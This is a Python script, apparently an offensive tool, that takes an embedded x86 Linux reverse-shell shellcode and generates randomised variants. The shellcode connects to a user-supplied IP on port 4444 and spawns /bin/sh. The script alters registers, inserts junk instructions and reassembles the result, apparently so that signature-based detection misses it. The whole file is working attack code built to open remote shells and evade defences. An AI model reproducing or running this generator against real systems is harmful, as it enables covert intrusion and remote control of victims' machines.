from capstone import *
from pwn import asm, context
import random
import sys

shellcode = b"\x89\xe5\x31\xc0\xb8\x00\x00\x00\x00\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

md = Cs(CS_ARCH_X86, CS_MODE_32)
# Get ASM instructions from shellcode in a list
listOfInstructs = list(md.disasm(shellcode, 0x1000))
if len(sys.argv) < 2:
    print("Usage: python script.py <IP_ADDRESS>")
    sys.exit(1)

ip_address = sys.argv[1]
# Print instructions
#for i in listOfInstructs:
#    print("0x%x:%s\t%s" % (i.address, i.mnemonic, i.op_str))

modifiedInstructs = []

def genRandomString(length):
    return "".join(random.choices('abcdefghijklmnopqrstuvwxyz', k=length))

def getRandomRegister():
    registers = ['ebx','ecx','edx','edi','esi']
    return random.choice(registers)
unimpactful_instructions = [
    ["xor eax, eax", "xor ebx, ebx"],
    ["xor ecx, ecx", "xor edx, edx"],
    ["push eax", "pop eax"],
    ["push ebx", "pop ebx"],
    ["push ecx", "pop ecx"],
    ["push edx", "pop edx"],
    ["inc eax", "inc ebx"],
    ["inc ecx", "inc edx"],
    ["dec eax", "dec ebx"],
    ["dec ecx", "dec edx"],
    ["mov eax, eax", "mov ebx, ebx"],
    ["mov ecx, ecx", "mov edx, edx"],
    ["lea eax, [eax]", "lea ebx, [ebx]"],
    ["lea ecx, [ecx]", "lea edx, [edx]"],
    ["xchg eax, ebx", "xchg eax, ebx"],
    ["xchg ecx, edx", "xchg ecx, edx"],
    #["push eax", "push ebx", "xchg eax, ebx", "pop eax", "pop ebx"],
    #["push ecx", "push edx", "xchg ecx, edx", "pop ecx", "pop edx"],
    ["add eax, 0x01", "sub eax, 0x01"],
    ["add ebx, 0x1b", "sub ebx, 0x1b"],
    ["add ecx, 0x4c", "sub ecx, 0x4c"],
    ["add edx, 0xfd", "sub edx, 0xfd"],
    ["xchg eax, ebx", "xchg eax, ebx"],
    ["xchg ecx, edx", "xchg ecx, edx"],
    #["push eax", "push ebx", "xchg eax, ebx", "pop eax", "pop ebx"],
    #["push ecx", "push edx", "xchg ecx, edx", "pop ecx", "pop edx"],
    ["xchg eax, ebx", "xchg eax, ebx", "xchg ecx, edx", "xchg ecx, edx"]
    #["push eax", "push ebx", "push ecx", "push edx", "xchg eax, ebx", "xchg ecx, edx", "pop eax", "pop ebx", "pop ecx", "pop edx"],
    #["push eax", "push ebx", "xchg eax, ebx", "pop eax", "pop ebx", "push ecx", "push edx", "xchg ecx, edx", "pop ecx", "pop edx"],
    #["xchg eax, ebx", "push eax", "push ebx", "pop eax", "pop ebx", "xchg ecx, edx", "push ecx", "push edx", "pop ecx", "pop edx"],
    #["push eax", "push ebx", "push ecx", "push edx", "xchg eax, ebx", "xchg ecx, edx", "pop eax", "pop ebx", "pop ecx", "pop edx", "push eax", "push ebx", "push ecx", "push edx", "pop eax", "pop ebx", "pop ecx", "pop edx"],
    #["xchg eax, ebx", "xchg ecx, edx", "push eax", "push ebx", "push ecx", "push edx", "pop eax", "pop ebx", "pop ecx", "pop edx"]
]

def getUnimpactfulInstructs():
    nbInstructs = random.randint(1,5)
    instructs = random.sample(unimpactful_instructions, nbInstructs)
    string ="\n" + "\n".join(["\n".join(instr) for instr in instructs])
    return string

def countSCLen(shellcode):
    shellcode = shellcode.strip('"')
    byte= shellcode.split('\\x')[1:]
    return len(byte)

def int2hex(int):
    return hex(int & 0xFFFF)[2:].zfill(2)

def process_ip(ip):
    # Split the IP address into parts and convert them to integers
    parts = list(map(int, ip.split('.')))
    
    # Check if any part is 0
    if any(part == 0 for part in parts):
        # Substitute each part from 255 and store them in a new list
        transformed_parts = [255 - part for part in parts]
        
        # Convert each part of the list to hexadecimal using int2hex
        hex_values = [int2hex(part) for part in transformed_parts]
        
        # Concatenate the hex values in reverse order as a single string
        result = '0x' + ''.join(hex_values[::-1])
        
        # Return the formatted string for when any part is 0
        return f"mov eax,0xffffffff\nmov ebx,{result}\nxor ebx,eax\npush ebx"
    else:
        # Use the original parts if no part is 0
        hex_values = [int2hex(part) for part in parts]
        
        # Concatenate the hex values in reverse order as a single string
        result = '0x' + ''.join(hex_values[::-1])
        
        # Return the formatted string for when no part is 0
        return f"push {result}"

# Edit specific instructions using the offset
random_label = genRandomString(random.randint(1,9))
reg = getRandomRegister()
for instruct in listOfInstructs:
    #if instruct.address == (0x1000) and random.randint(1,2)== 2:
    #    modifiedInstruct = "mov eax, esp\nxchg ebp, eax\nxor eax,eax"
    if instruct.address == (0x1000 + 2):
        modifiedInstruct = "xor " + reg + "," + reg

    elif instruct.address == (0x1000 + 4):
        if random.randint(1,5) == 3:
            modifiedInstruct = "mov " + reg + ",0"
        else:
            modifiedInstruct = "mov " + reg + ",0"
    elif instruct.address == (0x1000 + 13):
        modifiedInstruct = "push " + reg + getUnimpactfulInstructs() 
    elif instruct.address == (0x1000 + 14):
        modifiedInstruct = "push " + reg + getUnimpactfulInstructs()
    elif instruct.address == (0x1000 + 28):
        modifiedInstruct = "xor eax,eax\nmov ax, 0x5c11\npush ax"
    elif instruct.address == (0x1000 + 32):
        modifiedInstruct = "xor eax,eax\nmov al,2\npush ax"
    elif instruct.address == 0x1000 + 15:
        modifiedInstruct = process_ip(ip_address)
    elif instruct.address == 0x1000 + 20:
        modifiedInstruct = ""
    elif instruct.address == 0x1000 + 25:
        modifiedInstruct = ""
    elif instruct.address == 0x1000 + 27:
        modifiedInstruct = ""

    # =========== MANDATORY ========================
    elif instruct.address == (0x1000 + 67):

        modifiedInstruct = random_label + ":\n" + instruct.mnemonic + ' ' + instruct.op_str
    elif instruct.address == (0x1000 + 75):
        modifiedInstruct = "loop " + random_label
    else:
        modifiedInstruct = f"{instruct.mnemonic} {instruct.op_str}"
    modifiedInstructs.append(modifiedInstruct)

# Prepare the new instructions for compilation
modAsm = "\n".join(modifiedInstructs) + "\n"
#print("===========================")
#print(modAsm)

# Compile asm instructions and print new shellcode
context.update(arch="i386")
shellcode = asm(modAsm)
shellcode_str = ''.join([f"\\x{b:02x}" for b in shellcode])
print(modAsm)
print(f"Shellcode : \"{shellcode_str}\"")
print(countSCLen(shellcode_str))
print(process_ip("127.1.1.1"))
